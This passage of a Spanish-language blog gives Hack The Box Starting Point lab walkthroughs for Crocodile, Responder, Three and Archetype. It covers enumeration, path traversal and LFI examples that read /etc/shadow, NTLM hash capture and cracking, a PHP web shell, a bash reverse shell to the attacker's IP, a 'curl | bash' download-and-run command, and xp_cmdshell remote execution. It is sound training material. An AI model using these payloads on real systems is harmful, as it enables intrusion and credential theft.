Nos acepta la conexión y por tanto ya podemos intentar a ejecutar comandos SQL.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/maria3.png" alt="under" oncontextmenu="return false;">
</div>

Vemos unas bases de datos y todo normal pero, una de ellas llama poderosamente la atención y es la 'htb'. Así que usamos con:
```
show databases;
use htb;
show tables;
select * from users;
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/maria4.png" alt="under" oncontextmenu="return false;">
</div>

Vemos usuarios y correos, pero aun no vemos la flag, así que revisamos la tabla 'config':

```
select * from config;
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/sequel/flag.png" alt="under" oncontextmenu="return false;">
</div>

Y hemos completado la máquina.

<hr />
<h2 id="crocodile"><h1 class="amarillo">Crocodrile</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/crocodile.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina y nos da la dirección IP 10.129.1.15 y probamos lanzando 5 trazas ICMP para comprobar que el host este activo.

```bash
❯ ping -c 5 10.129.1.15
PING 10.129.1.15 (10.129.1.15) 56(84) bytes of data.
64 bytes from 10.129.1.15: icmp_seq=1 ttl=63 time=101 ms
64 bytes from 10.129.1.15: icmp_seq=2 ttl=63 time=97.6 ms
64 bytes from 10.129.1.15: icmp_seq=3 ttl=63 time=98.1 ms
64 bytes from 10.129.1.15: icmp_seq=4 ttl=63 time=142 ms
64 bytes from 10.129.1.15: icmp_seq=5 ttl=63 time=99.3 ms
--- 10.129.1.15 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4000ms
rtt min/avg/max/mdev = 97.627/107.604/142.192/17.327 ms
```

El resultado de ping nos arroja un TTL de 63, entonces nos estamos enfrentando a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Para comenzar con la fase de enumeración vamos a realizar un escaneo rápido y sigiloso usando nmap para identificar puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.1.15 -oG allPorts
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos de la captura una serie de puertos abiertos tal que `21, 80`. Vamos a eliminar el ruido con la herramienta **extractPorts**:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Lo siguiente será hacer un escaneo usando nmap y una serie de scripts básicos de reconocimiento:

```bash
nmap -sCV -p21,80 10.129.1.15 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Vemos que la máquina tiene puerto 21 FTP `3.0.3` que es vulnerable a **Anonymous Login**. Antes de revisar el servicio FTP vamos a realizar un análisis web a la 10.129.1.15:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

No vemos nada, así que haremos un escaneo con nmap usando un script programado en Lua, para identificar rutas comunes de servicios web con:

```bash
nmap --script hhtp-enum 10.129.1.15 -oN webScan
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/webScan.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos algo muy interesante en la captura de nmap una ruta llamada `login.php`, pero por ahora entablaremos una conexión con el FTP usando como credenciales "anonymous:" y sin contraseña:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/ftp.png" alt="under" oncontextmenu="return false;">
</div>

Listamos el contenido del servicio FTP:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/ftp2.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos 2 archivos llamados 'allowed.userlist' y 'allowed.userlist.passwd' que es información sensible no sanitizada. Las descargamos a nuestra máquina con el comando `get`.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/ftp3.png" alt="under" oncontextmenu="return false;">
</div>

Y vemos posibles usuarios y credenciales, aun así ahora no podemos hacer nada. Abrimos la página web y vemos lo siguiente.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/web.png" alt="under" oncontextmenu="return false;">
</div>

Aun así no encontramos nada importante en la pagina, iremos la dirección que encontramos previamente 'http://10.129.1.15/login.php' y encontramos un panel de Login, probamos con credenciales por defecto 'admin:admin' 'root:root' 'admin:password' 'guest:guest' y no conseguimos nada. Probamos una inyección SQL 'admin'#:pruebatest1234' y sin resultados:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/web2.png" alt="under" oncontextmenu="return false;">
</div>


Probamos con las credenciales que obtuvimos previamente desde el servicio FTP:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/cocodrile/flag.png" alt="under" oncontextmenu="return false;">
</div>

Hemos completado la máquina.

<hr />
<h2 id="responder"><h1 class="amarillo">Responder</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/responder.png" alt="under" oncontextmenu="return false;">
</div>


Encendemos la máquina y nos da la dirección IP 10.129.175.41, enviamos unos paquetes para saber si el Host está activo:

```bash
❯ ping -c 5 10.129.175.41
PING 10.129.175.41 (10.129.175.41) 56(84) bytes of data.
64 bytes from 10.129.175.41: icmp_seq=1 ttl=127 time=115 ms
64 bytes from 10.129.175.41: icmp_seq=2 ttl=127 time=123 ms
64 bytes from 10.129.175.41: icmp_seq=3 ttl=127 time=101 ms
64 bytes from 10.129.175.41: icmp_seq=4 ttl=127 time=97.9 ms
64 bytes from 10.129.175.41: icmp_seq=5 ttl=127 time=98.2 ms
--- 10.129.175.41 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 97.862/107.099/123.071/10.278 ms
```

Con un TTL de 127 estamos enfrentando una máquina Windows.
<h2 class="amarillo">Enumeración</h2>

Lanzamos un escaneo rápido y sigiloso con nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.175.41 -oG allPorts
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Vemos 3 puertos abiertos, quitaremos el ruido de la captura de nmap con la herramienta previamente definida en la .zshrc **extractPorts**:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>

Con la información parseada más importante de la captura vemos los puertos `80, 5985, 7680` pero, aun necesitamos un poco más de información. Por tanto, hacemos un escaneo con nmap usando una serie de scripts básicos de reconocimiento:

```bash
nmap -sCV -p80,5985,7680 10.129.175.41 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

Comenzado con el puerto 80, vamos a tratar de enumerar un poco más a detalle con la herramienta `whatweb`:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Encontramos que hay un dominio **unika.htb**, es decir, que al momento de ingresar por la dirección IP el navegador no entiende y no puede resolvernos la página de la máquina, por ahora seguimos enumerando el otro puerto HTTP:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/whatweb2.png" alt="under" oncontextmenu="return false;">
</div>

Sin resultados, lo siguiente sera enumerar posibles rutas comunes por el puerto 80 usando nmap con un script programado en Lua. De esta manera haremos un poco de enumeración web:

```bash
namp --script http-enum 10.129.175.41 -oN webScan
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/webScan.png" alt="under" oncontextmenu="return false;">
</div>

Las rutas comunes fueron encontradas empleando un diccionario corto y no son muy prometedoras, se intenta como alternativa usar una herramienta más pesada como `gobuster` para enumerar posibles rutas comunes en el servicio web pero, haciendo uso de un diccionario más grande:

```bash
gobuster dir --url 10.129.175.41 --wordlist /opt/apps/Tools/SecList/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirScan
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/dirbust.png" alt="under" oncontextmenu="return false;">
</div>

Pero no hay nada, así que probamos agregando una búsqueda por archivos con la extensión .PHP sin resultados.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/dirbust2.png" alt="under" oncontextmenu="return false;">
</div>

Si ingresamos el dominio `unika.htb` en el navegador nos encontramos conque Firefox no entiende y no puede resolver nuestra solicitud.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/web.png" alt="under" oncontextmenu="return false;">
</div>

Por tanto, para arreglaro se agrega al archivo `/etc/hosts` la dirección IP de la máquina y el dominio.

```bash
# Static table lookup for hostnames.
# See hosts(5) for details.
127.0.0.1	localhost
::1		    localhost
127.0.1.1	ferxoo.localdomain	ferxoo

10.129.175.41	unika.htb
```

Al guardar el nuevo `/etc/hosts` y recargar la página en nuestro navegador, ahora si nos resuelve y encontramos una página web.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/web2.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Es una página sencilla y no cuenta con muchos apartados pero, uno de ellos llama la atención y es cuando cambiamos el idioma de la página a Frances. Podemos ver que la URL cambia y tenemos una variable `page` que quizás podamos explotar.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/web3.png" alt="under" oncontextmenu="return false;">
</div>

Intentamos con un Path Trasversal:

<hr />
<h3 class="verde">¿Qué es Path Trasversal?</h3>

Un directory traversal (o salto de directorio o cruce de directorio o path traversal) consiste en explotar una vulnerabilidad informática que ocurre cuando no existe suficiente seguridad en cuanto a la validación de un usuario, permitiéndole acceder a cualquier tipo de directorio superior (padre) sin ningún control.

La finalidad de este ataque es ordenar a la aplicación a acceder a un archivo al que no debería poder acceder o no debería ser accesible. Este ataque se basa en la falta de seguridad en el código. El software está actuando exactamente como debe actuar y en este caso el atacante no está aprovechando un bug en el código.

Directory traversal también es conocido como el ../ ataque punto punto barra, escalado de directorios y backtracking. 
<a><strong>Ejemplo</strong></a>

Un ejemplo típico de una aplicación vulnerable es:

```php
<?php
$template = 'blue.php';
if ( isset( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( "/home/users/paloloco/templates/" . $template );
?>
```

Un ataque contra este sistema podría ser mandar la siguiente petición de HTTP:

```
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/shadow
```

Generando el servidor una respuesta como:
```
HTTP/1.0 200 OK
Content-Type: text/html
Server: Apache

root:fi3sED95ibqR6:0:1:System Operator:/:/bin/bash 
daemon:*:1:1::/tmp: 
paloloco:f8fk3j1OIf31.:182:100:Developer:/home/users/paloloco/:/bin/bash
```

La repetición de los caracteres `../` después de '/home/users/paloloco/templates/' ha causado que el código `[include()](http://www.php.net/manual/en/function.include.php)` penetre hasta el [directorio raíz](https://es.wikipedia.org/wiki/Directorio_ra%C3%ADz "Directorio raíz") y entonces fuese al directorio de contraseñas de [UNIX](https://es.wikipedia.org/wiki/Unix "Unix") "/etc/shadow".

El archivo de contraseñas de UNIX es un archivo que se utiliza comúnmente para realizar el **directory traversal**, y es utilizado frecuentemente para [crackear](https://es.wikipedia.org/wiki/Password_cracking "Password cracking") las contraseñas.

<hr />

Intentamos hacer Path Trasversal con la variable `page`:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/web4.png" alt="under" oncontextmenu="return false;">
</div>

No podemos hacer Path Trasversal pero, recordando que hay un puerto 7680:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/pando.png" alt="under" oncontextmenu="return false;">
</div>

El puerto `7680` pando-pub usa el Protocolo de Control de Transmisión. TCP es uno de los protocolos principales en redes TCP/IP. TCP es un protocolo orientado en la conexión, necesita el apretón de manos para determinar comunicaciones de principio a fin. Solo cuando la conexión es determinada, los datos del usuario pueden ser mandados de modo bidireccional por la conexión.

<hr />
<h3 class="verde">¿Qué es Local File Inclusion LFI?</h3>

LFI son vulnerabilidades web que son posibles gracias a errores por parte de los programadores. Al introducir un descuido de seguridad en las aplicaciones web, los programadores descuidados permiten que usuarios no autorizados accedan a archivos, aprovechen la funcionalidad de descarga, naveguen por la información disponible y mucho más.

PHP emplean estas dos funciones para incluir el contenido de un archivo PHP en otro:

1. La función include()
2. La función require().

Lo que separa a estas funciones es cómo responden a los problemas de carga de archivos. La primera función include señala una advertencia pero permite que el script continúe. La segunda, la función require, por otro lado, crea un error fatal, deteniendo así el script.

Entonces, ¿cómo sería un ataque de inclusión de archivos PHP? Algo parecido a esto:

```
https://example.com/?page=filename.php
```

Este es un trozo de código que sería vulnerable a un ataque LFI. Verás, cuando la entrada no está desinfectada correctamente, los atacantes no tendrán problemas para modificar la entrada (el ejemplo de abajo) y manipular la aplicación para acceder a archivos restringidos, directorios e información general a través de la directiva “../”. Esto es lo que se conoce como Directory Path Traversal:

```
https://example.com/?page=../../../../etc/test.txt
```

En este caso, lo único que tuvo que hacer el ciberdelincuente fue sustituir “nombrearchivo.php” por “../../../etc/test.txt” en la URL de la ruta y, et voilà, pudo acceder al archivo de prueba. En esta fase, el intruso o intrusos podrían cargar un script malicioso en su servidor y acceder a ese script utilizando local file inclusion.

<hr />

Gracias a este protocolo podemos probar con la herramienta `responder` a intentar un LFI:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/responder2.png" alt="under" oncontextmenu="return false;">
</div>


> **NTLM** es una colección de protocolos creados por MS, permite autenticar usuarios con un dominio usando un desafío y si las respuestas coinciden el servidor permite el acceso.

La funcion Hash entorno a formularios respecta, tienen su uso para almacenar contraseñas de forma más segura, de manera que no se puede convertir un Hash a su estado original. Un servidor guarda el Hash de la contraseña y cuando el usuario trata de iniciar sesión su texto digitado se 'Hashea' y se compara con el almacenado. Si esto es correcto entonces la contraseña es valida.

Un NTHash es la salida del algoritmo que almacena estas contraseñas en sistemas Windows y Controladores de Dominio.

Aquí entra `responder`, así podremos crear un SMB Malicioso tal que, cuando la página intente su NTLM, `responder` le envía un desafío, cuando el Servidor responde `responder` va a utilizar el desafío y la respuesta encriptada para generar un NetNTLMv2 y probamos varias contraseñas. Entonces si alguna genera el desafío **Esa sera la contraseña**. Este concepto se llama `Hash Cracking`.

Ejecutamos `sudo python3 responder.py -I tun0`:


<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/responder3.png" alt="under" oncontextmenu="return false;">
</div>


Y en la URL intentamos cargar un archivo cualquiera usando nuestra dirección IP de la VPN '//10.10.16.84/file'

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/responder4.png" alt="under" oncontextmenu="return false;">
</div>


Revisamos nuevamente `responder` y obtenemos el Hash. Luego, este Hash podemos guardarlo en un archivo '.txt' y podemos usar la herramienta `john the ripper` para 'Crackear' la contraseña.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/hash.png" alt="under" oncontextmenu="return false;">
</div>

Para ello usamos `john` y el diccionario `rockyou.txt` y le pasamos el Hash.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/hash2.png" alt="under" oncontextmenu="return false;">
</div>

Y obtenemos la contraseña del usuario 'Administrator:badminton'. Para entablar una conexión usamos la herramienta `evil-winrm`, posterior instalamos las gemas necesarias:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/winrm.png" alt="under" oncontextmenu="return false;">
</div>

Y ahora podemos ejecutar:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/winrm2.png" alt="under" oncontextmenu="return false;">
</div>

Entramos con `-i 10.129.175.41 -u administrator -p badminton`:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/intrusion.png" alt="under" oncontextmenu="return false;">
</div>

Y con un poco de búsqueda encontramos la flag:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/responder/flag.png" alt="under" oncontextmenu="return false;">
</div>

 y hemos completado la máquina.

<hr />
<h2 id="three"><h1 class="amarillo">Three</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/three.webp" alt="under" oncontextmenu="return false;">
</div>





Encendemos la máquina y nos da la dirección IP 10.129.91.236 y probamos a lanzar unas trazas ICMP para saber si el host está activo.

```bash
❯ ping -c 5 10.129.91.236
PING 10.129.91.236 (10.129.91.236) 56(84) bytes of data.
64 bytes from 10.129.91.236: icmp_seq=1 ttl=63 time=144 ms
64 bytes from 10.129.91.236: icmp_seq=2 ttl=63 time=99.6 ms
64 bytes from 10.129.91.236: icmp_seq=3 ttl=63 time=97.8 ms
64 bytes from 10.129.91.236: icmp_seq=4 ttl=63 time=97.8 ms
64 bytes from 10.129.91.236: icmp_seq=5 ttl=63 time=98.1 ms
--- 10.129.91.236 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 97.779/107.395/143.705/18.167 ms
```

Con un TTL 63 sabemos que nos estamos enfrentando a una máquina Linux.
<h2 class="amarillo">Enumeración</h2>

Para la fase de enumeración con nmap vamos a lanzar un escaneo rápido y sigiloso:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.91.236 -oG allPorts
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/nmap.png" alt="under" oncontextmenu="return false;">
</div>

Limpiamos ruido y con **extractPorts** copiamos los puertos abiertos para realizar un escaneo exhaustivo con nmap y una serie de scripts básico de reconocimiento para saber la versión y servicio:

```bash
nmap -sCV -p22,80 10.129.91.236 -oN targeted
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/nmap2.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un puerto 22 y un 80 abiertos, probamos con la herramienta `whatweb` a enumerar un poco el servicio web:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/whatweb.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un potencial dominio 'thetoppers.htb' pero, por ahora sigamos enumerando, vamos a realizar un escaneo con nmap y script programado en Lua para utilizar un diccionario que contiene posibles rutas comunes que pueda contemplar este servicio web:

```bash
nmap --script http-enum 10.129.91.236 -oN webScan
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/webscan.png" alt="under" oncontextmenu="return false;">
</div>

<h2 class="amarillo">Explotación</h2>

Al no encontrar mucha información de los escaneos web, probamos a enumerar directorios con la herramienta `gobuster`

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/dirbust.png" alt="under" oncontextmenu="return false;">
</div>

No hay nada, así que probamos con posibles archivos .PHP:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/filebust.png" alt="under" oncontextmenu="return false;">
</div>

No encontramos nada entonces abriremos la web

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/web.png" alt="under" oncontextmenu="return false;">
</div>

Por más exhaustiva que sea la búsqueda en la web no hay nada pero, no significa que no haya nada, ya que en realidad si usamos `gobuster` para filtrar por **VHOST** la cosa cambia totalmente:

<hr />
<h3 class="verde">¿Qué es VHOST?</h3>

Es bastante sencillo de entender este concepto ya que un servidor tiene una dirección IP, pero puede tener multiples dominos, y en base al dominio que se acceda la información puede variar y ser diferente.

> No es lo mismo acceder a 10.129.91.236, que acceder a thetoppers.htb. Pueden diferentes en su contenido o tener una ligera variación.

<hr />
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/vhostbust.png" alt="under" oncontextmenu="return false;">
</div>

Y encontramos 2 subdominios pero, el único que nos interesa es el `s3.thetoppers.htb` ya que S3 proviene de un servicio de Cloud de Amazon:

<hr />
<h3 class="verde">¿Qué es S3 Bucket AWS?</h3>

Un bucket S3 de AWS es un recurso de almacenamiento en la nube que permite guardar datos manera segura, eficiente y escalable. Es un servicio de Amazon Web Services (AWS) llamado Simple Storage Service (S3)

<hr />

Para conectarnos podemos instalar 'aws-cli':

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/aws.png" alt="under" oncontextmenu="return false;">
</div>

La típica para usar el cliente de aws es utilizar el comando, seguido de llamar a s3 y ejecutar por ejemplo un 'ls':

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

En caso de arrojar un error simplemente ejecutamos `aws configure` y ponemos todo como **temp**.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/aws2.png" alt="under" oncontextmenu="return false;">
</div>

Tenemos capacida de lectura y podemos listar el contenido almacenado en el Bucket de S3 Amazon.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/aws3.png" alt="under" oncontextmenu="return false;">
</div>

Ya que la página interpreta código .PHP, podemos crear un pequeño script .PHP para subirlo al Bucket S3 de Amazon.

**Shell.php**
```php
<?php
	system($_GET["cmd"]);
?>
```

Lo subimos ejecutando `cp shell.php` al Bucket.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/shell2.png" alt="under" oncontextmenu="return false;">
</div>

Y en la web probamos a cargar el recurso, y no vemos nada eso es buena señal.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion.png" alt="under" oncontextmenu="return false;">
</div>

Ya que a través de la variables `cmd`podremos ejecutar comandos de manera remota y hemos conseguido un RCE Remote Command Execution.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion2.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a listar el '/etc/passwd'. Y vemos que 2 usuarios tienen una Bash como consola.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion3.png" alt="under" oncontextmenu="return false;">
</div>

Como podemos subir contenido al Bucket, nos podemos crear una Reverse Shell, entonces la máquina nos va a enviar una Bash a nuestra máquina como atacante.

**Reverse.sh**
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.84/1337 0>&1
```

Subimos el Reverse.sh, nos montamos con `python3 -m http.server 8000` Un servidor HTTP, y nos ponemos en escucha con la herramienta `netcat` por el puerto 1337.

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion4.png" alt="under" oncontextmenu="return false;">
</div>

Si entramos a la página y escribos muestra shell, debemos de poder ver en texto plano el código:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion5.png" alt="under" oncontextmenu="return false;">
</div>

Lo que debemos hacer es en la variable `cmd` ejecutar:

```bash
curl 10.10.16.84:8000/lian.sh|bash
```

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion6.png" alt="under" oncontextmenu="return false;">
</div>

Y revisando nuestra terminal vemos que el servidor web montado con Python ha recibido una petición Get. Y por el puerto 1337 con netcat hemos recibido una conexión. 

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/intrusion7.png" alt="under" oncontextmenu="return false;">
</div>

Hemos hecho la intrusión en la máquina y vemos la flag:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/three/flag.png" alt="under" oncontextmenu="return false;">
</div>

<hr />
<a href=""><strong>Bonus</strong></a>

Al recibir la conexión con la herramienta `netcat` para tener un mejor control de la consola, podemos hacer un tratamiento TTY, basicamente poder usar la consola que nos la máquina sin problemas. Para eso ejecutamos una vez recibida la consola:

```bash
Pulsamos ------> Ctrl + z
y Escribimos --> stty raw -echo; fg
```

Y terminamos escribiendo:

```bash
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

Exportamos las variables de entorno **TERM** y **SHELL**

```bash
www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```


1. export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).

2. export SHELL=bash` -> Para que nuestra shell sea una bash.

<hr />
<h2 id="whity">Tier 3</h2>
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/Tier3.png" alt="under" oncontextmenu="return false;">
</div>



<hr />
<h2 id="archetype"><h1 class="amarillo">Archetype</h1></h2>

<div id="imgs" style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/archetype.webp" alt="under" oncontextmenu="return false;">
</div>
Comenzamos encendiendo la máquina y tenemos la dirección IP 10.129.204.6, le enviamos una traza ICMP con ping para saber si la máquina esta activa.
```bash
❯ ping -c 5 10.129.204.6
PING 10.129.204.6 (10.129.204.6) 56(84) bytes of data.
64 bytes from 10.129.204.6: icmp_seq=1 ttl=127 time=104 ms
64 bytes from 10.129.204.6: icmp_seq=2 ttl=127 time=100 ms
64 bytes from 10.129.204.6: icmp_seq=3 ttl=127 time=101 ms
64 bytes from 10.129.204.6: icmp_seq=4 ttl=127 time=97.8 ms
64 bytes from 10.129.204.6: icmp_seq=5 ttl=127 time=114 ms

--- 10.129.204.6 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 97.845/103.341/114.042/5.675 ms
```

Vemos un TTL de 127. Por tanto, estamos frente a un Windows.

<h2 class="amarillo">Enumeración</h2>

Empezamos lanzando un escaneo rápido y sigiloso con nmap:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.204.6 -oG allPorts
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/nmap.png" alt="under" oncontextmenu="return false;">
</div>


Vemos varios puertos abiertos entonces para limpiar ruido usamos la utilidad previamente definida **extractPorts**:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/extractPorts.png" alt="under" oncontextmenu="return false;">
</div>


Con los puertos copiados en la clipboard lanzamos un escaneo exhaustivo con nmap usando una serie de scripts básicos de reconocimiento para identificar la version y servicio:

```bash
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -oN targeted
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/nmap2.png" alt="under" oncontextmenu="return false;">
</div>


No nos interesa ver los puertos abiertos tan altos a partir del 5985, no son relevantes.
<h2 class="amarillo">Explotación</h2>

El puerto más adecuado para comenzar es el `445` porque tiene un recurso SMB compartido a nivel de red al cual nos conectaremos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/smb.png" alt="under" oncontextmenu="return false;">
</div>


Y vemos un directorio compartido llamado `backups`. Entraremos a ese directorio:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/smb2.png" alt="under" oncontextmenu="return false;">
</div>


Listando el contenido encontramos un archivo interesante llamado `prod.dtsConfig`. Lo traeremos a nuestra máquina con `get`.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/smb3.png" alt="under" oncontextmenu="return false;">
</div>


Revisando el archivo de configuración encontramos Information Leakage, ya que vemos en texto plano `password:M3g4c0rp123` para el usuario **ARCHETYPE\sql_svc**.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/infoLeakage.png" alt="under" oncontextmenu="return false;">
</div>


Con estas credenciales podemos hacer uso de la herramienta impacket.

> Impacket **es una colección de clases de Python que se integran con aplicaciones como los escáneres de vulnerabilidades**, lo que les permite funcionar con los protocolos de red de Windows.

Impacket cuenta con una serie de scripts que nos pueden ser de utilidad al tratar con una máquina Windows.
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/impacket.png" alt="under" oncontextmenu="return false;">
</div>


El script que usaremos es `mssqlclient.py` para poder conectarnos al servicio MS-SQL:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/impacket2.png" alt="under" oncontextmenu="return false;">
</div>


Una vez dentro podremos probar que privilegios tenemos con:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/impacket3.png" alt="under" oncontextmenu="return false;">
</div>


Al tener un 1, significa que podemos hacer cambios
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/impacket4.png" alt="under" oncontextmenu="return false;">
</div>


Nos dice que debemos poner `xp_cmdshell` en 1:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/sql.png" alt="under" oncontextmenu="return false;">
</div>


Su valor por defecto está en 0, así que lo cambiamos:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/sql2.png" alt="under" oncontextmenu="return false;">
</div>


Y ahora tenemos un RCE:

<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/RCE.png" alt="under" oncontextmenu="return false;">
</div>


Aprovechandonos del RCE subimos el nc64 para entablarnos una reverse shell con netcat:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/intrusion.png" alt="under" oncontextmenu="return false;">
</div>


Y ejecutamos la shell con powershell:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/intrusion2.png" alt="under" oncontextmenu="return false;">
</div>


Una vez dentro, ya podremos leer la flag del usuario:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/userflag.png" alt="under" oncontextmenu="return false;">
</div>


<h2 class="amarillo">Escalada</h2>

Para esta parte, encontramos una carpeta interesante `PSReadLine`, con un archivo **ConsoleHost_history**:
<div style="text-align: center;">
  <img src="/assets/images/HTB/StartingPoint/archetype/privesc.png" alt="under" oncontextmenu="return false;">
</div>


